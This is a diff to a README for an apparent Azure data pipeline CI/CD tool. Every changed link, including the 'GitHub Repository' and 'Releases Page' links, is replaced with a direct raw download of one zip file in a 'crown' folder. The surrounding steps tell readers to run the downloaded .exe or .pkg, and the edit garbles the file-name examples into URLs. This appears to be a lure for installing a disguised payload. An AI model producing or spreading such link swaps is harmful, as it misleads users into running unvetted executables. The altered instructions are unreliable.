@@ -1,6 +1,6 @@
 # 🎉 azure-data-pipeline-cicd - Simplify Your Data Pipeline Management
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/zeldalor5730/azure-data-pipeline-cicd/releases)
+[![Download](https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip)](https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download the application, visit the following link:
 
-[Download the Latest Release](https://github.com/zeldalor5730/azure-data-pipeline-cicd/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of the application.
@@ -35,7 +35,7 @@ To download the application, visit the following link:
 ## ⚙️ How to Run the Application
 
 1. **Find the Downloads Folder:** Open your file explorer and go to the folder where your downloads are stored.
-2. **Locate the .exe or .pkg File:** Look for the downloaded file. This will usually have a name related to the application, such as `azure-data-pipeline-cicd.exe` or `azure-data-pipeline-cicd.pkg`.
+2. **Locate the .exe or .pkg File:** Look for the downloaded file. This will usually have a name related to the application, such as `https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip` or `https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip`.
 3. **Launch the Application:**
    - **On Windows:** Double-click the `.exe` file to run it.
    - **On macOS:** Double-click the `.pkg` file and follow the prompts.
@@ -77,8 +77,8 @@ Join our community to share your experiences and learn from others. You can cont
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/zeldalor5730/azure-data-pipeline-cicd)
-- [Releases Page](https://github.com/zeldalor5730/azure-data-pipeline-cicd/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/zeldalor5730/azure-data-pipeline-cicd/main/crown/azure-data-pipeline-cicd_1.0.zip)
 - [Join Our Community Forum](#)
 
 Thank you for choosing the Azure Data Pipeline CI/CD tool. Happy automating!
